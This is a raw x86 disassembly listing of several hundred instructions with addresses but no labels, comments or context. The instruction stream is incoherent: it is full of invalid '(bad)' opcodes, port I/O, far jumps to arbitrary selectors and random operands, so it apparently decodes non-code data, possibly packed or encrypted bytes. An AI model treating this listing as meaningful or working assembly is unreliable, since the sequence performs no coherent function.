  41dc85:	shl    BYTE PTR [ebp-0x64],0xd7
  41dc89:	ss pushf 
  41dc8b:	ds nop
  41dc8d:	fisubr WORD PTR [edx]
  41dc8f:	add    BYTE PTR [ecx],al
  41dc91:	shr    WORD PTR [edi],1
  41dc94:	fucomi st,st(5)
  41dc96:	xchg   ebx,eax
  41dc97:	icebp  
  41dc98:	xor    esi,esi
  41dc9a:	retf   
  41dc9b:	push   es
  41dc9c:	jl     0x41dca5
  41dc9e:	je     0x41dcbf
  41dca0:	xchg   esp,eax
  41dca1:	cmp    al,0x9d
  41dca3:	cmp    cl,dh
  41dca5:	fiadd  WORD PTR [ebx]
  41dca7:	add    eax,0x48df075
  41dcac:	adc    ecx,esi
  41dcae:	popa   
  41dcaf:	push   edi
  41dcb0:	push   0x9bbe5900
  41dcb5:	js     0x41dca0
  41dcb7:	nop
  41dcb8:	or     DWORD PTR [edx-0x79],0x77
  41dcbc:	mov    cl,0xe1
  41dcbe:	cmp    al,0x95
  41dcc0:	or     DWORD PTR ds:0xff602c97,0x33
  41dcc7:	push   ss
  41dcc8:	fnclex 
  41dcca:	inc    esi
  41dccb:	(bad)  
  41dccc:	pop    esp
  41dccd:	mov    ch,0x87
  41dccf:	pop    edx
  41dcd0:	out    dx,eax
  41dcd1:	mov    ebp,0x489d85e
  41dcd6:	cmp    eax,0x9ce8d5b1
  41dcdb:	mov    edx,0xeb246ea8
  41dce0:	pop    ecx
  41dce1:	pop    es
  41dce2:	push   ecx
  41dce3:	mov    ch,BYTE PTR [eax-0x62741221]
  41dce9:	pop    ebp
  41dcea:	add    ebx,DWORD PTR [edi]
  41dcec:	es loopne 0x41dcea
  41dcef:	test   al,0xb9
  41dcf1:	mov    al,ds:0x600bba26
  41dcf6:	cmp    eax,0x740b6197
  41dcfb:	aam    0x2d
  41dcfd:	fimul  DWORD PTR [esi]
  41dcff:	loopne 0x41dcce
  41dd01:	rol    BYTE PTR [esi-0x7d7c028a],0x3c
  41dd08:	push   0x4
  41dd0a:	push   esi
  41dd0b:	pop    edx
  41dd0c:	in     al,dx
  41dd0d:	out    dx,al
  41dd0e:	add    edi,DWORD PTR [ebx]
  41dd10:	push   0x2815dc40
  41dd15:	mov    edx,0xc20db831
  41dd1a:	xlat   BYTE PTR ds:[ebx]
  41dd1b:	pop    ss
  41dd1c:	repnz mov DWORD PTR [edi],0x4004aaa
  41dd23:	sbb    esi,esi
  41dd25:	jne    0x41dd1b
  41dd27:	push   0x3
  41dd29:	push   ecx
  41dd2a:	jl     0x41dcb4
  41dd2c:	xchg   ecx,eax
  41dd2d:	xchg   edx,eax
  41dd2e:	inc    ebx
  41dd2f:	sub    DWORD PTR [edx+0x3229d89d],edx
  41dd35:	(bad)  
  41dd36:	pusha  
  41dd37:	xor    DWORD PTR [bx],ecx
  41dd3a:	sub    BYTE PTR [eax+edx*4+0x1b],0x8b
  41dd3f:	jne    0x41ddaf
  41dd41:	lahf   
  41dd42:	adc    al,0x64
  41dd44:	es push ds
  41dd46:	pop    edi
  41dd47:	push   ebp
  41dd48:	mov    eax,?
  41dd4a:	dec    ecx
  41dd4b:	es jns 0x41dcec
  41dd4e:	test   BYTE PTR [edi+0x8a6f809],bl
  41dd54:	clc    
  41dd55:	add    al,0x85
  41dd57:	jb     0xca0dea1
  41dd5d:	xlat   BYTE PTR ds:[ebx]
  41dd5e:	add    bh,BYTE PTR [edx*8+0x11e6f32a]
  41dd65:	mov    dl,0xa9
  41dd67:	inc    esi
  41dd68:	(bad)  
  41dd69:	push   DWORD PTR ds:0x448a23eb
  41dd6f:	push   ds
  41dd70:	jmp    FWORD PTR [edi+eax*2]
  41dd73:	je     0x41dd8f
  41dd75:	sub    al,0x20
  41dd77:	je     0x41dd8f
  41dd79:	scas   al,BYTE PTR es:[edi]
  41dd7a:	ret    0xc6bd
  41dd7d:	test   al,0x85
  41dd7f:	sbb    al,0x1
  41dd81:	nop
  41dd82:	call   0x238:0x13f64c81
  41dd89:	cdq    
  41dd8a:	jle    0x41dd42
  41dd8c:	(bad)  
  41dd8d:	dec    edi
  41dd8e:	cs pusha 
  41dd90:	(bad)  
  41dd91:	mov    ebp,0x801b5755
  41dd96:	dec    ecx
  41dd97:	or     ebp,DWORD PTR ds:0x8b2ef971
  41dd9d:	shr    DWORD PTR [ebx+edi*1],cl
  41dda0:	lock jnp 0x41ddbe
  41dda3:	sub    bh,BYTE PTR [ecx+esi*8+0x17]
  41dda7:	lock lods eax,DWORD PTR ds:[esi]
  41dda9:	add    ebx,DWORD PTR [ebp+0x7f]
  41ddac:	dec    ecx
  41ddad:	out    0x3b,eax
  41ddaf:	clc    
  41ddb0:	inc    eax
  41ddb1:	mov    edx,0x888d8c88
  41ddb6:	mov    ecx,0x6e09f602
  41ddbb:	mov    ebx,0xba4a0fdd
  41ddc0:	xchg   esp,eax
  41ddc1:	xor    BYTE PTR [ebx],al
  41ddc3:	jmp    0x41de43
  41ddc5:	mov    edx,0x79074b98
  41ddca:	sbb    DWORD PTR cs:[ecx+edx*1],eax
  41ddce:	test   al,0x83
  41ddd0:	ret    
  41ddd1:	xor    cl,cl
  41ddd3:	adc    bl,bh
  41ddd5:	add    ebp,ebx
  41ddd7:	push   esi
  41ddd8:	mov    edx,0x30bc9bb0
  41dddd:	sbb    ah,ah
  41dddf:	ins    DWORD PTR es:[edi],dx
  41dde0:	jle    0x41ddcb
  41dde2:	pop    ecx
  41dde3:	je     0x41dde9
  41dde5:	jne    0x41ddf5
  41dde7:	xor    al,0xc8
  41dde9:	jmp    0x41dddb
  41ddeb:	dec    eax
  41ddec:	cs jns 0x41ddf3
  41ddef:	in     al,dx
  41ddf0:	in     al,dx
  41ddf1:	jle    0x6f2966a
  41ddf7:	fs push ebp
  41ddf9:	jne    0x41dd9a
  41ddfb:	dec    esp
  41ddfc:	pop    esp
  41ddfd:	sbb    cl,cl
  41ddff:	in     al,dx
  41de00:	dec    edi
  41de01:	xor    esp,ebx
  41de03:	pop    ebp
  41de04:	enter  0xe704,0x57
  41de08:	sbb    BYTE PTR [bp+di-0x27f8],bh
  41de0d:	add    edi,edi
  41de0f:	pop    ds
  41de10:	gs add al,ah
  41de13:	jbe    0x41ddd5
  41de15:	mov    ecx,0x23bf2b1f
  41de1a:	adc    BYTE PTR [edi],al
  41de1c:	(bad)  
  41de1d:	mov    edx,0x552da2d7
  41de22:	pop    ebx
  41de23:	xlat   BYTE PTR ds:[ebx]
  41de24:	js     0x41de9c
  41de26:	pop    edi
  41de27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de28:	sti    
  41de29:	add    BYTE PTR [eax],ah
  41de2b:	adc    al,0x82
  41de2d:	cmp    BYTE PTR ds:0x5c04c8fe,dh
  41de33:	mov    WORD PTR [ebp+0x1dc6fccc],es
  41de39:	clc    
  41de3a:	cmp    DWORD PTR [ebp-0x29632924],0x755b18ee
  41de44:	sbb    al,0x37
  41de46:	jmp    0x85db:0x9edce87b
  41de4d:	ror    BYTE PTR [ecx+0x47],1
  41de50:	cmp    BYTE PTR [eax],0x23
  41de53:	aaa    
  41de54:	and    BYTE PTR [ebx],dh
  41de56:	mov    ds:0xc1359d02,al
  41de5b:	mov    ebp,0x8fe7f84a
  41de60:	enter  0xebc6,0x9
  41de64:	sub    esi,DWORD PTR [ebp+0x6740fd65]
  41de6a:	add    bh,BYTE PTR [esi+0x4d]
  41de6d:	mov    dl,0x5c
  41de6f:	pop    eax
  41de70:	in     al,0x8b
  41de72:	rol    BYTE PTR [edx+0x60],1
  41de75:	cwde   
  41de76:	sub    esp,DWORD PTR [eax+0x45aef1e]
  41de7c:	adc    bl,bl
  41de7e:	sbb    ch,BYTE PTR [edi+0x1]
  41de81:	mov    eax,0x2a40a168
  41de86:	psubb  mm4,QWORD PTR [ecx+0x2ca72cb]
  41de8d:	pop    edi
  41de8e:	mov    ebp,0x90305823
  41de93:	xchg   edx,eax
  41de94:	cli    
  41de95:	loop   0x41dec0
  41de97:	mov    dl,0xdd
  41de99:	add    esp,DWORD PTR [edi]
  41de9b:	loop   0x41de26
  41de9d:	jge    0x41de70
  41de9f:	test   al,0x40
  41dea1:	neg    BYTE PTR [edi-0x5c]
  41dea4:	adc    bl,BYTE PTR [eax+eax*4+0x7c]
  41dea8:	add    bh,bh
  41deaa:	cs je  0x41deb5
  41dead:	mov    eax,0x5133736c
  41deb2:	sub    eax,edi
  41deb4:	jne    0x41dee0
  41deb6:	cld    
  41deb7:	inc    eax
  41deb8:	cmp    BYTE PTR [edi],0x4e
  41debb:	jmp    0x4b29:0x3d0440e0
  41dec2:	fmul   DWORD PTR [ebp+0x41db3a95]
  41dec8:	push   cs
  41dec9:	add    DWORD PTR [ebx+0x19583821],eax
  41decf:	mov    esi,ebx
  41ded1:	shl    DWORD PTR [ebx-0x2d],0xa
  41ded5:	cld    
  41ded6:	mov    BYTE PTR [ebp+0x243d04a8],0xac
  41dedd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dede:	adc    eax,0xf2b05ce8
  41dee3:	hlt    
  41dee4:	push   ds
  41dee5:	mov    ah,0xe4
  41dee7:	rol    BYTE PTR [esi],cl
  41dee9:	iret   
  41deea:	mov    eax,0xbc3e0a05
  41deef:	rol    BYTE PTR [ebx-0x792d1ad],0x1e
  41def6:	(bad)  
  41def7:	enter  0x5aa,0x5e
  41defb:	cmp    cl,BYTE PTR [edx+ebx*2]
  41defe:	push   0xffffff96
  41df00:	lea    edx,[edi]
  41df02:	sub    BYTE PTR [eax],cl
  41df04:	imul   ebx,DWORD PTR [eax],0xf04930ba
  41df0a:	or     eax,0x2e01957a
  41df0f:	sbb    BYTE PTR [eax-0x59],al
  41df12:	loop   0x41df1a
  41df14:	sub    BYTE PTR [ebx+ebx*4+0x2a877825],bh
  41df1b:	pop    eax
  41df1c:	dec    eax
  41df1d:	mov    esp,edx
  41df1f:	mov    eax,ds:0x896e57dc
  41df24:	lahf   
  41df25:	aam    0x1f
  41df27:	sbb    BYTE PTR [esi-0x5f],bl
  41df2a:	clc    
  41df2b:	push   esi
  41df2c:	or     esp,ecx
  41df2e:	pop    es
  41df2f:	outs   dx,DWORD PTR ds:[esi]
  41df30:	adc    DWORD PTR [esi+0x44b09412],edi
  41df36:	push   eax
  41df37:	or     BYTE PTR [eax-0x61],cl
  41df3a:	fnstsw WORD PTR [ebx-0x47]
  41df3d:	mov    WORD PTR [eax-0x46b3f7ad],?
  41df43:	adc    edx,DWORD PTR [eax+0x20]
  41df46:	lock mov ch,0x68
  41df49:	div    ah
  41df4b:	and    DWORD PTR [eax+0x307e0845],ebx
  41df51:	ret    
  41df52:	jecxz  0x41df19
  41df54:	xor    al,0xa2
  41df56:	push   eax
  41df57:	xor    eax,0x406a36eb
  41df5c:	add    bl,cl
  41df5e:	jo     0x41df92
  41df60:	pop    eax
  41df61:	pop    esi
  41df62:	aam    0x56
  41df64:	pop    ebx
  41df65:	out    dx,al
  41df66:	sbb    DWORD PTR [ebp+0x68],esi
  41df69:	adc    BYTE PTR [edx],dh
  41df6b:	inc    ebp
  41df6c:	lds    esi,FWORD PTR [edx]
  41df6e:	push   es
  41df6f:	add    eax,0xe04b4b7f
  41df74:	bound  eax,QWORD PTR [eax+ebx*2+0x42]
  41df78:	add    ecx,edx
  41df7a:	stos   DWORD PTR es:[edi],eax
  41df7b:	xchg   edi,eax
  41df7c:	or     eax,0x68dd4d0a
  41df81:	test   al,0xb0
  41df83:	sahf   
  41df84:	cli    
  41df85:	lea    eax,[edi+0x4]
  41df88:	inc    edx
  41df89:	add    ecx,DWORD PTR [ebx]
  41df8b:	push   esi
  41df8c:	stc    
  41df8d:	cld    
  41df8e:	test   bl,bl
  41df90:	jno    0x41df37
  41df92:	add    BYTE PTR [eax-0x69b0d77b],0xbc
  41df99:	rol    BYTE PTR [eax-0x5d31d97f],0x51
  41dfa0:	imul   edi,eax,0xa84d3ab2
  41dfa6:	(bad)  
  41dfa7:	fs lock pusha 
  41dfaa:	mov    al,0xee
  41dfac:	push   cs
  41dfad:	les    edi,FWORD PTR [ebp-0x2b]
  41dfb0:	mov    ds:0x2a96230a,al
  41dfb5:	fsincos 
  41dfb7:	pop    esi
  41dfb8:	mov    BYTE PTR ds:0x5777b0c1,0x5a
  41dfbf:	add    al,0xa9
  41dfc1:	adc    BYTE PTR ds:0x847b77fe,0x1a
  41dfc8:	nop
  41dfc9:	push   edi
  41dfca:	pushf  
  41dfcb:	mov    ds:0x7044e68d,eax
  41dfd0:	xor    dl,bl
  41dfd2:	test   eax,0x609195da
  41dfd7:	and    al,0xc7
  41dfd9:	jp     0x41df7e
  41dfdb:	mov    ds:0x3f02f8aa,eax
  41dfe0:	les    ecx,FWORD PTR [edx+0x78804f9b]
  41dfe6:	or     al,0x33
  41dfe8:	hlt    
  41dfe9:	sti    
  41dfea:	daa    
  41dfeb:	jecxz  0x41e00e
  41dfed:	je     0x41dfb2
  41dfef:	aam    0x8a
  41dff1:	push   cs
  41dff2:	or     DWORD PTR [ebp+eiz*1-0x7c],edx
  41dff6:	les    ebp,FWORD PTR ds:0x636552bd
  41dffc:	or     BYTE PTR [ecx-0x580e1f2b],bh
  41e002:	(bad)  
  41e003:	xor    ebx,ebx
  41e005:	(bad)  
  41e006:	stos   BYTE PTR es:[edi],al
  41e007:	lock adc eax,0x188bff58
  41e00d:	cmp    ebx,0x6
  41e010:	jg     0x41e01b
  41e012:	cmp    esi,DWORD PTR [ebx*8-0xecdadec]
  41e019:	mov    dl,0x11
  41e01b:	cmp    bl,bh
  41e01d:	sbb    edx,DWORD PTR ds:0x18dd0c8b
  41e023:	inc    edx
  41e024:	push   esp
  41e025:	pusha  
  41e026:	sahf   
  41e027:	push   ecx
  41e028:	or     BYTE PTR [ebp+0x1deb3492],bh
  41e02e:	sbb    dh,al
  41e030:	inc    esp
  41e031:	push   esp
  41e032:	inc    al
  41e034:	outs   dx,BYTE PTR ds:[esi]
  41e035:	ss jle 0x41e045
  41e038:	rcl    BYTE PTR [esi+0x3d],1
  41e03b:	xchg   ebx,eax
  41e03c:	sub    al,0x89
  41e03e:	jo     0x41e04c
  41e040:	pop    ecx
  41e041:	sbb    edx,edi
  41e043:	(bad)  
  41e044:	xor    ch,BYTE PTR [edi+0xafea454]
  41e04a:	push   esp
  41e04b:	sti    
  41e04c:	xchg   DWORD PTR [ebx+0x530169e0],ebp
  41e052:	push   eax
  41e053:	sar    dh,1
  41e055:	retf   0xc74
  41e058:	push   es
  41e059:	jbe    0x41e06b
  41e05b:	js     0x41e034
  41e05d:	adc    BYTE PTR [edx+ebp*8+0x4e127216],cl
  41e064:	adc    eax,0x6d2a078c
  41e069:	adc    DWORD PTR [edx],ecx
  41e06b:	jmp    0x41e098
  41e06d:	push   cs
  41e06e:	nop
  41e06f:	and    esp,DWORD PTR [ebx+0x10]
  41e072:	push   es
  41e073:	push   ebp
  41e074:	sub    dl,0x34
  41e077:	or     bl,ch
  41e079:	jbe    0x41e0eb
  41e07b:	lea    ebp,[ebx+ecx*4]
  41e07e:	(bad)  
  41e07f:	or     esi,DWORD PTR [edx-0x15]
  41e082:	pop    es
  41e083:	fucomip st,st(4)
  41e085:	pop    ss
  41e086:	push   0xffffff87
  41e088:	data16 adc BYTE PTR [esi+0x5be03dc2],cl
  41e08f:	aaa    
  41e090:	loopne 0x41e0da
  41e092:	add    BYTE PTR [ebx+0x2d],0x2a
  41e096:	cld    
  41e097:	loope  0x41e0fe
  41e099:	inc    ebx
  41e09a:	pop    esi
  41e09b:	adc    ebx,DWORD PTR [eax]
  41e09d:	pusha  
  41e09e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e09f:	out    0xa,al
  41e0a1:	add    esp,DWORD PTR [ecx-0x6f]
  41e0a4:	daa    
  41e0a5:	add    eax,0x8ae34e04
  41e0aa:	shl    DWORD PTR [ecx-0x3c41130],cl
  41e0b0:	push   es
  41e0b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e0b2:	adc    eax,0xb5250a0
  41e0b7:	mov    ch,ah
  41e0b9:	or     al,0xf0
  41e0bb:	fmul   QWORD PTR [esi+0x17]
  41e0be:	int    0x7d
  41e0c0:	hlt    
  41e0c1:	clc    
  41e0c2:	push   ds
  41e0c3:	in     al,0x96
  41e0c5:	push   esp
  41e0c6:	loopne 0x41e069
  41e0c8:	cld    
  41e0c9:	ror    al,0x87
  41e0cc:	xchg   DWORD PTR [ebp-0x20],ecx
  41e0cf:	xor    BYTE PTR [edi+eiz*2+0x70],bl
  41e0d3:	and    BYTE PTR [edi+eiz*4],bh
  41e0d6:	shl    DWORD PTR [ebx+0x17e0a567],cl
  41e0dc:	lock aam 0xd5
  41e0df:	(bad)
  41e0e2:	out    0x89,al
  41e0e4:	loopne 0x41e0c6
  41e0e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e0e7:	or     ah,0xaa
  41e0ea:	ins    DWORD PTR es:[edi],dx
  41e0eb:	add    BYTE PTR [ecx-0x3c],bh
  41e0ee:	inc    esi
  41e0ef:	loop   0x41e088
  41e0f1:	ja     0x41e143
  41e0f3:	xchg   esp,eax
  41e0f4:	ror    BYTE PTR [ebp+0x4804c1fa],0xc3
  41e0fb:	and    edi,DWORD PTR [esi]
  41e0fd:	rcl    DWORD PTR [ebp-0x1731c094],0x18
  41e104:	clc    
  41e105:	push   ds
  41e106:	fstp   TBYTE PTR [ebx+ebx*8+0x5f006bd8]
  41e10d:	cs daa 
  41e10f:	ja     0x41e11c
  41e111:	pop    ecx
  41e112:	push   ebx
  41e113:	push   ebp
  41e114:	cmp    al,0x48
  41e116:	je     0x41e0af
  41e118:	xchg   ebx,eax
  41e119:	pop    ds
  41e11a:	in     al,0x48
  41e11c:	jmp    0x41e173
  41e11e:	xor    esi,DWORD PTR [edi+esi*1-0x15]
  41e122:	inc    edi
  41e123:	xor    eax,0x973ffb28
  41e128:	sub    edx,DWORD PTR [esi]
  41e12a:	jmp    0x41e15b
  41e12c:	and    eax,0xb021eb1d
  41e131:	add    eax,ebx
  41e133:	mov    al,0x4
  41e135:	add    al,0x4d
  41e137:	shl    DWORD PTR [ecx*2+0x8070605],cl
  41e13e:	or     DWORD PTR [ebx],ecx
  41e140:	inc    eax
  41e141:	dec    ebp
  41e142:	shl    DWORD PTR [esp+ecx*1],cl
  41e145:	or     eax,0x62f2160e
  41e14a:	imul   edi,DWORD PTR [eax],0x27
  41e14d:	xor    eax,0x8b51b095
  41e152:	pushf  
  41e153:	push   cs
  41e154:	and    BYTE PTR [edx],0x12
  41e157:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e158:	mov    WORD PTR [edx+0x69],?
  41e15b:	out    dx,al
  41e15c:	add    BYTE PTR [ecx+edx*1-0x65574ff6],cl
  41e163:	cld    
  41e164:	sub    eax,0xf7bace5
  41e169:	test   al,0x6c
  41e16b:	shl    ecx,1
  41e16d:	lahf   
  41e16e:	retf   0xfc58
  41e171:	cmp    DWORD PTR [ebx+0x14],0xfffffffa
  41e175:	(bad)  
  41e177:	pop    eax
  41e178:	pop    eax
  41e179:	rol    BYTE PTR [ebx-0x5a],0x98
  41e17d:	inc    ebp
  41e17e:	mov    eax,0x2a6c1843
  41e183:	mov    DWORD PTR [eax+0x16e488ee],esp
  41e189:	or     al,0x50
  41e18b:	in     al,dx
  41e18c:	sub    al,0xe1
  41e18e:	and    ecx,DWORD PTR [ecx-0x7abe1383]
  41e194:	mov    dh,0x7e
  41e196:	or     BYTE PTR [ebx],dl
  41e198:	rcl    DWORD PTR [ebx-0x29],0x8f
  41e19c:	loopne 0x41e13a
  41e19e:	stc    
  41e19f:	rcl    BYTE PTR [ecx],cl
  41e1a1:	dec    edi
  41e1a2:	loopne 0x41e13d
  41e1a4:	fs pop ds
  41e1a6:	xor    al,0x95
  41e1a8:	or     dh,BYTE PTR [eax+0x1b8dfefe]
  41e1ae:	lea    edx,[ebp-0x7bc1b128]
  41e1b4:	xlat   BYTE PTR ds:[ebx]
  41e1b5:	pushf  
  41e1b6:	add    eax,0x5df32b8b
  41e1bb:	lock xor ebp,DWORD PTR [ebx+0x20]
  41e1bf:	bound  esi,QWORD PTR [eax]
  41e1c1:	mov    eax,DWORD PTR [ecx+0x36c073bc]
  41e1c7:	repnz cmc 
  41e1c9:	ror    BYTE PTR [ebx],0x25
  41e1cc:	les    ebx,FWORD PTR [edi]
  41e1ce:	enter  0xb2f8,0x5
  41e1d2:	loopne 0x41e201
  41e1d4:	xchg   edi,eax
  41e1d5:	int3   
  41e1d6:	ror    ch,1
  41e1d8:	out    dx,al
  41e1d9:	or     BYTE PTR [esi],bh
  41e1db:	int    0xac
  41e1dd:	mov    WORD PTR [eax-0x727c0f5f],gs
  41e1e3:	pop    ds
  41e1e4:	jnp    0x41e1d6
  41e1e6:	nop
  41e1e7:	pop    ds
  41e1e8:	js     0x41e17e
  41e1ea:	gs jmp 0x41e24a
  41e1ed:	xor    DWORD PTR [eax+0x3e5c877d],edx
  41e1f3:	in     eax,0x94
  41e1f5:	mov    ebp,0xd2a09c98
  41e1fa:	pop    esp
  41e1fb:	inc    esi
  41e1fc:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  41e1fe:	nop
  41e1ff:	add    cl,BYTE PTR [ecx+ecx*1-0x435b66dd]
  41e206:	mov    WORD PTR [ebp-0x70],es
  41e209:	out    0x70,eax
  41e20b:	add    edx,DWORD PTR [esi]
  41e20d:	test   al,0x8c
  41e20f:	and    esp,DWORD PTR [ecx]
  41e211:	inc    edi
  41e212:	pop    edi
  41e213:	ret    0x5cbf
  41e216:	int3   
  41e217:	rcr    DWORD PTR [edx+0xd],1
  41e21a:	jae    0x41e1f1
  41e21c:	mov    edi,0xac5725c7
  41e221:	outs   dx,DWORD PTR ds:[esi]
  41e222:	ja     0x41e1ff
  41e224:	cld    
  41e225:	or     eax,0x5ff58b6e
  41e22a:	rol    BYTE PTR [ebx-0x157c023e],1
  41e230:	or     dh,ch
  41e232:	sbb    eax,0x730a0e4a
  41e237:	and    ah,BYTE PTR [ecx]
  41e239:	jo     0x41e1eb
  41e23b:	stos   BYTE PTR es:[edi],al
  41e23c:	and    edx,0x3b
  41e23f:	call   0x4896:0xf7809329
  41e246:	pop    ecx
  41e247:	adc    al,0x30
  41e249:	iret   
  41e24a:	sbb    al,0xf2
  41e24c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e24d:	mov    ecx,0xf000f4d7
  41e252:	mov    eax,ds:0xf2f05698
  41e257:	or     eax,DWORD PTR [ebx+0x1e]
  41e25a:	sahf   
  41e25b:	add    al,0x61
  41e25d:	pusha  
  41e25e:	lods   al,BYTE PTR ds:[esi]
  41e25f:	pusha  
  41e260:	shl    BYTE PTR [edx],cl
  41e262:	cmp    BYTE PTR [esi+eax*1],bl
  41e265:	pop    ebx
  41e266:	cmp    al,0xd
  41e269:	and    DWORD PTR [edi-0x72571de7],eax
  41e26f:	imul   edx,DWORD PTR [ecx-0x3edb8b94],0xffffffd3
  41e276:	cmp    eax,0x39380677
  41e27b:	sar    BYTE PTR [esi-0x5ca00728],cl
  41e281:	(bad)  
  41e283:	cmp    DWORD PTR [esp+ebp*2-0x7fa86bd4],0x64
  41e28b:	nop
  41e28c:	mov    eax,ds:0x136556a4
  41e291:	loopne 0x41e2ad
  41e293:	mov    al,0x70
  41e295:	rcl    BYTE PTR [eax+ecx*1],0x57
  41e299:	ins    DWORD PTR es:[edi],dx
  41e29a:	xchg   DWORD PTR [eax-0x33571399],edi
  41e2a0:	sub    cl,BYTE PTR [ebx-0x30ff5e02]
  41e2a6:	lahf   
  41e2a7:	retf   
  41e2a8:	sti    
  41e2a9:	das    
  41e2aa:	xor    al,0xa6
  41e2ac:	inc    esp
  41e2ad:	or     al,0x20
  41e2af:	mov    eax,0xa840a580
  41e2b4:	xchg   ebx,eax
  41e2b5:	push   edx
  41e2b6:	jle    0x41e337
  41e2b8:	and    BYTE PTR [ecx+0x199cb802],cl
  41e2be:	xchg   esp,eax
  41e2bf:	push   esi
  41e2c0:	inc    eax
  41e2c1:	je     0x41e272
  41e2c3:	out    dx,al
  41e2c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e2c5:	cmp    eax,0xa11a64e4
  41e2ca:	shufps xmm4,xmm0,0x0
  41e2ce:	loope  0x41e2e9
  41e2d0:	jo     0x41e2e3
  41e2d2:	pop    ebp
  41e2d3:	es daa 
  41e2d5:	in     eax,dx
  41e2d6:	inc    eax
  41e2d7:	lods   al,BYTE PTR ds:[esi]
  41e2d8:	pop    ds
  41e2d9:	inc    esp
  41e2da:	nop
  41e2db:	nop
  41e2dc:	xor    bl,0x34
  41e2df:	lock adc DWORD PTR [edi-0x4f88c8bc],eax
  41e2e6:	mov    dl,0x30
  41e2e8:	push   cs
  41e2e9:	xor    edx,DWORD PTR [ecx]
  41e2eb:	or     al,0x1b
  41e2ed:	fs fmul st,st(4)
  41e2f0:	and    eax,DWORD PTR [eax]
  41e2f2:	or     al,0x11
  41e2f4:	test   al,0xc9
  41e2f6:	lods   al,BYTE PTR ds:[esi]
  41e2f7:	jb     0x41e291
  41e2f9:	daa    
  41e2fa:	pusha  
  41e2fb:	ins    BYTE PTR es:[edi],dx
  41e2fc:	inc    esp
  41e2fe:	test   eax,0x94ca7440
  41e303:	pop    ss
  41e304:	dec    edx
  41e305:	mov    al,0xb7
  41e307:	jbe    0x41e31d
  41e309:	pusha  
  41e30a:	loop   0x41e2d5
  41e30c:	mov    ds:0xe0ce48bc,eax
  41e311:	and    edi,DWORD PTR [edi]
  41e313:	adc    BYTE PTR [ebx+eiz*4],al
  41e316:	ror    BYTE PTR [eax],0xa3
  41e319:	les    edx,FWORD PTR [eax+0x1d]
  41e31c:	das    
  41e31d:	mov    bh,0xa9
  41e31f:	cmp    dl,ch
  41e321:	add    DWORD PTR [ebp+0x10],esi
  41e324:	push   cs
  41e325:	bnd jmp DWORD PTR [ebx-0x45adf38]
  41e32c:	popf   
  41e32d:	dec    edx
  41e32e:	dec    edx
  41e32f:	push   ds
  41e330:	adc    eax,0x3808ccb8
  41e335:	fld    TBYTE PTR [ebp+ebx*8+0x50]
  41e339:	adc    al,0xb9
  41e33b:	add    BYTE PTR [edi-0x303b4034],0x6
  41e342:	sbb    bl,dh
  41e344:	xor    dh,0xc4
  41e347:	data16 cmp BYTE PTR [esi+ecx*2],0xa0
  41e34c:	inc    ecx
  41e34d:	sub    dl,ah
  41e34f:	pusha  
  41e350:	into   
  41e351:	adc    al,0x91
  41e353:	or     al,0xfd
  41e355:	sbb    esp,DWORD PTR [esi]
  41e357:	dec    esp
  41e358:	hlt    
  41e359:	jmp    0x41e3a3
  41e35b:	mov    esi,edi
  41e35d:	dec    esi
  41e35e:	jmp    0x41e361
  41e360:	dec    esi
  41e361:	add    DWORD PTR [ebx],ebp
  41e363:	mov    bl,0x5f
  41e365:	fcom   DWORD PTR [edx]
  41e367:	mov    cl,BYTE PTR [eax+esi*1]
  41e36a:	and    ecx,0xe9720d3f
  41e370:	jg     0x41e375
  41e372:	mov    al,0x42
  41e374:	in     al,0xce
  41e376:	and    al,0xd8
  41e378:	jns    0x41e37f
  41e37a:	dec    ecx
  41e37b:	imul   BYTE PTR [edi]
  41e37d:	add    al,0xf0
  41e37f:	or     ecx,0xfffffffe
  41e382:	inc    ecx
  41e383:	es add al,0xb2
  41e386:	add    ch,bl
  41e388:	adc    ecx,DWORD PTR [edx+0x2e933804]
  41e38e:	and    DWORD PTR [esi+ecx*1+0x2],ebp
  41e392:	mov    eax,edx
  41e394:	das    
  41e395:	or     DWORD PTR [eax+0x3b450005],eax
  41e39b:	and    esp,DWORD PTR [ebx]
  41e39d:	xchg   esp,eax
  41e39e:	les    esi,FWORD PTR [edi+ecx*1+0x5]
  41e3a2:	enter  0x86f5,0x7d
  41e3a6:	aam    0x9a
  41e3a8:	ins    BYTE PTR es:[edi],dx
  41e3a9:	out    dx,al
  41e3aa:	xor    ecx,ecx
  41e3ac:	cmp    eax,DWORD PTR [edi]
  41e3ae:	daa    
  41e3af:	jge    0x41e356
  41e3b1:	sar    BYTE PTR [edx+0x5977c14a],cl
  41e3b7:	lock jle 0x41e3c3
  41e3ba:	add    DWORD PTR [edi-0x6bea4bdf],edi
  41e3c0:	adc    eax,0x2d42489b
  41e3c5:	adc    al,0x6a
  41e3c7:	das    
  41e3c8:	cmp    eax,0x5c216ed
  41e3cd:	xor    al,0xac
  41e3cf:	inc    esi
  41e3d0:	jge    0x41e438
  41e3d2:	mov    eax,ds:0xefbe8d61
  41e3d7:	mov    cl,0x30
  41e3d9:	pop    ecx
  41e3da:	inc    eax
  41e3db:	cmp    bl,BYTE PTR [ecx]
  41e3dd:	sbb    dh,ah
  41e3df:	cmp    edi,ebx
  41e3e1:	jl     0x41e408
  41e3e3:	aaa    
  41e3e4:	or     eax,0xf6858168
  41e3e9:	inc    ebx
  41e3ea:	into   
  41e3eb:	inc    ebx
  41e3ec:	inc    ebp
  41e3ed:	dec    eax
  41e3ee:	jge    0x41e46c
  41e3f0:	popf   
  41e3f1:	shl    BYTE PTR [ecx-0x16c840fc],0x94
  41e3f8:	adc    DWORD PTR [eax],ecx
  41e3fa:	cmp    DWORD PTR [eax+0x25],0xf91927ed
  41e401:	imul   esp,DWORD PTR [ecx],0x171fa846
  41e407:	or     BYTE PTR [edi+0x32],0xc7
  41e40b:	cmp    ebx,DWORD PTR [ebp-0xc]
  41e40e:	jge    0x41e40e
  41e410:	in     al,0x68
  41e412:	fucom  st(6)
  41e414:	jl     0x41e3eb
  41e416:	jne    0x41e43b
  41e418:	sbb    eax,0xa10c671e
  41e41d:	pusha  
